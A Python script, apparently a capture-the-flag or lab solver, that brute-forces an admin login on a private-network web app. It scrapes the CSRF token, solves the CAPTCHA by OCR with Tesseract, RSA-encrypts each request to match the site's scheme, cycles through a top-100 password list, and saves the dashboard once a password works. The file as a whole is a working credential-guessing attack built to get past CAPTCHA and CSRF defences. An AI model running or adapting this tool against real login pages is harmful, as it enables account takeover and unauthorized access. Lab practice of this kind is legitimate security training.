import requests
from bs4 import BeautifulSoup
from base64 import b64encode, b64decode
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_v1_5
from PIL import Image
import pytesseract
import io

# ==================== CONFIGURATION ====================
BASE_URL = "http://10.10.205.27"
LOGIN_PAGE = f"{BASE_URL}/index.php"
CAPTCHA_URL = f"{BASE_URL}/captcha.php"
LOGIN_ENDPOINT = f"{BASE_URL}/server.php"
DASHBOARD_URL = f"{BASE_URL}/dashboard.php"
USERNAME = "admin"
PASSWORD_FILE = "top100.txt"
TRY_LIMIT = 100

# ==================== RSA KEYS ====================
# Public key from server (used to encrypt login data)
server_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt38SAt9XfLRClH+41yxl
NIEOrHcZjGjrZZVV/R/XcuFJI2bBInWrmcnrQguajtO1tehWrdSCto+kP6wI2NyR
qL8tpuovK6SO1KT+TpkceeZyJIN+QGnp19pbLeDG3xZXK94AKxB0xH59DWHWcHNs
ktLz3RnW4xX+YI3o5hn/fcgPrxQ6kK4jYPm0xtbIYtcc86zH9+Cv6R+Y0rwfAXtG
0+YAJDYYRo0Aro1uV2zCG/9Khy/Dxrvm3Qc4OAidZsoS6dFv+0/Hp3UxF8FfAExw
Iwfx6YKfiC4xpGuDlxkyuP90L9T0Ke8KPfKhAqc5+aHE0EqYkXDRQQVrF5fmjdRk
LwIDAQAB
-----END PUBLIC KEY-----"""

# Private key from client (used to decrypt server's response)
client_private_key = """-----BEGIN PRIVATE KEY-----
... [REDACTED FOR GITHUB] ...
-----END PRIVATE KEY-----"""

# ==================== ENCRYPTION ====================
def encrypt_payload(data):
    """Encrypt login payload using RSA public key"""
    pub_key = RSA.import_key(server_public_key)
    cipher = PKCS1_v1_5.new(pub_key)
    encrypted = cipher.encrypt(data.encode())
    return b64encode(encrypted).decode()

def decrypt_response(enc_data):
    """Decrypt base64-encoded response using RSA private key"""
    priv_key = RSA.import_key(client_private_key)
    cipher = PKCS1_v1_5.new(priv_key)
    try:
        decrypted = cipher.decrypt(b64decode(enc_data), None)
        return decrypted.decode()
    except Exception:
        return "Decryption Failed"

# ==================== HELPERS ====================
def get_csrf_token(session):
    """Extract CSRF token from login page"""
    resp = session.get(LOGIN_PAGE)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token = soup.find("input", {"name": "csrf_token"})
    return token["value"] if token else ""

def solve_captcha(session):
    """Download and OCR the CAPTCHA image"""
    resp = session.get(CAPTCHA_URL)
    image = Image.open(io.BytesIO(resp.content)).convert("L")  # Convert to grayscale
    image = image.point(lambda x: 0 if x < 140 else 255, '1')   # Binarize
    captcha = pytesseract.image_to_string(image, config="--psm 7").strip()
    captcha = ''.join(filter(str.isalnum, captcha))  # Remove non-alphanumeric characters
    return captcha

# ==================== MAIN FUNCTION ====================
def brute_force_login():
    try:
        with open(PASSWORD_FILE, "rb") as f:
            passwords = [line.decode(errors="ignore").strip() for _, line in zip(range(TRY_LIMIT), f)]
    except FileNotFoundError:
        print(f"\u274c File not found: {PASSWORD_FILE}")
        return

    session = requests.Session()

    for i, password in enumerate(passwords, 1):
        print(f"[{i}/{TRY_LIMIT}] Trying password: {password}")

        csrf_token = get_csrf_token(session)
        captcha_text = solve_captcha(session)

        form_data = f"action=login&csrf_token={csrf_token}&username={USERNAME}&password={password}&captcha_input={captcha_text}"
        encrypted_data = encrypt_payload(form_data)

        headers = {"Content-Type": "application/json"}
        res = session.post(LOGIN_ENDPOINT, json={"data": encrypted_data}, headers=headers)

        if res.status_code == 200 and "data" in res.json():
            decrypted = decrypt_response(res.json()["data"])
            print(f"   \u21b3 Server response: {decrypted}")

            if "Login successful" in decrypted:
                print(f"\n\u2705 SUCCESS: Password is '{password}'")
                dashboard = session.get(DASHBOARD_URL)
                with open("dashboard.html", "w", encoding="utf-8") as f:
                    f.write(dashboard.text)
                print("[+] Dashboard saved to dashboard.html")
                break
        else:
            print("   [!] Server error or malformed response")

    else:
        print("\u274c Tried all 100 passwords — no valid login.")

# ==================== RUN ====================
if __name__ == "__main__":
    brute_force_login()
